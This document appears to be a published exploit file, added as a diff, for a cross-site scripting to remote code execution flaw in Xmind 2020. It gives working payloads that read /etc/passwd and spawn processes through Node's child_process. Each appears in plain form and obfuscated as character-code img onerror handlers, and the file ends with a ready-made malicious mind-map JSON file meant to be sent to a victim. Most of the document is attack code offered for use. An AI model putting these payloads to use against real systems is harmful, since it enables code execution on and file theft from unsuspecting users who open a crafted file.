@@ -1,0 +1,59 @@
+# Exploit Title: Xmind 2020 - XSS to RCE
+# Exploit Author: TaurusOmar
+# Date: May 4th, 2021
+# CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+# Risk: High (8.8)
+# Vendor Homepage: https://www.xmind.net/
+# Version: 2020
+# Tested on: Windows, Linux, MacOs
+
+# Software Description:
+XMind, a full-featured mind mapping and brainstorming tool, designed to generate ideas, inspire creativity, brings efficiency both in work and life. Millions and millions of WFH people love it.
+Many great products start with a small idea. Mind map can really be useful at the beginning of a project. Use it to record every idea in the meeting, you might be surprised by the difference and achievement it makes in the long run.
+
+
+# Vulnerability Description:
+The software allows you to store payloads in the form of files or as custom header titles, once the malicious code is entered, the payload will be executed when the victim moves the mouse or clicks.
+The attacker can send a malicious file with the payload, when this file is opened, the chain will be executed successfully giving access to the
+the remote attacker to get remote execution on the computer.
+
+
+#Proof video
+https://imgur.com/a/t96Nxo5
+
+
+# Payload 2: exec(/etc/passwd)
+
+#Decode Payload
+<script>
+const { spawn } = require("child_process");
+const cat = spawn("cat", ["/etc/passwd"]);
+cat.stdout.on("data", data => {
+    alert(`stdout: ${data}`);
+});</script>
+
+#Encode Payload
+<img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,99,111,110,115,116,32,123,32,115,112,97,119,110,32,125,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,59,10,99,111,110,115,116,32,99,97,116,32,61,32,115,112,97,119,110,40,34,99,97,116,34,44,32,91,34,47,101,116,99,47,112,97,115,115,119,100,34,93,41,59,10,99,97,116,46,115,116,100,111,117,116,46,111,110,40,34,100,97,116,97,34,44,32,100,97,116,97,32,61,62,32,123,10,32,32,32,32,97,108,101,114,116,40,96,115,116,100,111,117,116,58,32,36,123,100,97,116,97,125,96,41,59,10,125,41,59,60,47,115,99,114,105,112,116,62))>
+
+
+
+# Payload 2: exec(calc)
+
+#Decode Payload
+<script>
+var Process = process.binding('process_wrap').Process;
+var proc = new Process();
+proc.onexit = function(a,b) {};
+var env = process.env;
+var env_ = [];
+for (var key in env) env_.push(key+'='+env[key]);
+proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
+</script>
+
+#Encode Payload
+<img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>
+
+
+# File Malicious.json Payload
+
+[{"id":"5609f1388fd8c10e8f8798f104","class":"sheet","title":"Map 1","rootTopic":{"id":"b9aa22deba98b3b20c7ac8aca2","class":"topic","title":"\">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,108,101,116,32,123,32,115,112,97,119,110,32,125,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,59,10,108,101,116,32,108,115,32,61,32,115,112,97,119,110,40,34,108,115,34,44,32,91,34,45,108,97,34,93,41,59,10,108,115,46,115,116,100,111,117,116,46,111,110,40,34,100,97,116,97,34,44,32,100,97,116,97,32,61,62,32,123,10,32,32,32,32,97,108,101,114,116,40,96,115,116,100,111,117,116,58,32,36,123,100,97,116,97,125,96,41,59,125,41,59,60,47,115,99,114,105,112,116,62,10,10))>","structureClass":"org.xmind.ui.map.unbalanced","children":{"attached":[{"id":"b58888b5ceebbf0e68dada0656","title":"Main Topic 1","titleUnedited":true},{"id":"193b56735e689ae86a01d91513","title":"Main Topic 2","titleUnedited":true},{"id":"67ddbcb1-85c9-4478-a0aa-580e9fdcd971","title":"Main Topic 3","titleUnedited":true}]},"extensions":[{"content":[{"content":"3","name":"right-number"}],"provider":"org.xmind.ui.map.unbalanced"}]},"theme":{"id":"c669ec6d4d48895260d968fc99","importantTopic":{"type":"topic","properties":{"fo:font-weight":"bold","fo:color":"#2b2b2b","svg:fill":"#FFDC34"}},"minorTopic":{"type":"topic","properties":{"fo:font-weight":"bold","fo:color":"#2b2b2b","svg:fill":"#AB9738"}},"expiredTopic":{"type":"topic","properties":{"fo:font-style":"italic","fo:text-decoration":" line-through"}},"centralTopic":{"type":"topic","styleId":"9a13b7d6-cd05-44c3-b903-6c3a50edc46e","properties":{"shape-class":"org.xmind.topicShape.roundedRect","svg:fill":"#1B1B1D","fo:font-family":"Montserrat","fo:font-weight":"600","fo:font-style":"normal","line-width":"3","line-color":"#292929","border-line-width":"0"}},"map":{"type":"map","styleId":"f0e1f9bb-a8f5-486a-a70a-b72b2b6560d3","properties":{"svg:fill":"#000000"}},"subTopic":{"type":"topic","styleId":"9ea90eed-1da0-4c93-bac4-2085e16a0faf","properties":{"fo:font-family":"Montserrat","svg:fill":"#636366","shape-class":"org.xmind.topicShape.roundedRect","fo:font-size":"14pt","fo:text-align":"left","border-line-width":"0","fo:color":"#FFFFFF"}},"mainTopic":{"type":"topic","styleId":"42065f7f-018c-4eb9-9dc7-3a7bbf464915","properties":{"fo:font-family":"Montserrat","svg:fill":"#3A3A3C","border-line-width":"0","fo:font-weight":"600","fo:font-style":"normal","fo:font-size":"18pt","fo:text-align":"left","fo:color":"#FFFFFF","line-width":"2"}},"summaryTopic":{"type":"topic","styleId":"c8f4c32b-2607-4fae-bb85-b8736039e941","properties":{"fo:font-family":"Montserrat","svg:fill":"#8E8E93","fo:font-weight":"500","fo:font-style":"normal","line-color":"#292929","border-line-width":"0"}},"calloutTopic":{"type":"topic","styleId":"6f8bd667-fb82-4d0d-899f-05dc76c5945e","properties":{"fo:font-family":"Montserrat","svg:fill":"#8E8E93","fo:font-size":"14pt","fo:font-weight":"500","fo:font-style":"normal"}},"floatingTopic":{"type":"topic","styleId":"c9509bc2-2641-4f5f-8b38-e62c14c907f9","properties":{"fo:font-family":"Montserrat","border-line-width":"0","fo:font-weight":"500","fo:font-style":"normal","line-width":"2","line-color":"#292929"}},"boundary":{"type":"boundary","styleId":"0d7cf959-3b54-4849-88e1-cc0fc8c60341","properties":{"svg:fill":"#545455","shape-class":"org.xmind.boundaryShape.roundedRect","line-color":"#5D5D60","fo:font-weight":"500","fo:font-style":"normal","fo:color":"#FFFFFF","fo:font-size":"13pt","fo:font-family":"Montserrat"}},"relationship":{"type":"relationship","styleId":"57da2f8e-3f8d-47ee-a802-93023fc802c1","properties":{"line-color":"#8E8E93","line-width":"2","fo:font-weight":"500","fo:font-style":"normal","fo:font-family":"Montserrat","fo:color":"#FFFFFF","fo:font-size":"13pt"}},"summary":{"type":"summary","styleId":"ddeb9d94-1678-4129-8796-42b036e08dd2","properties":{"line-color":"#5A5A5A"}}},"topicPositioning":"fixed"}]
